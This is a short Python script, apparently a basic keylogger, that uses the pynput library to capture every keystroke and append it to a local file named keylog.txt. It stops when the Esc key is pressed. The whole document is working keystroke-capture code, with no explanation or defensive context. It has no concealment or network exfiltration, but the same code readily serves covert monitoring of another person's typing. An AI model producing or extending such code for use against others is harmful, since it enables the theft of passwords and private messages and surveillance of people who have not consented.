from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key} pressed\n")
    except Exception as e:
        print(f"Error logging key: {e}")

def on_release(key):
    if key == Key.esc:  # Stop the keylogger by pressing the 'esc' key
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
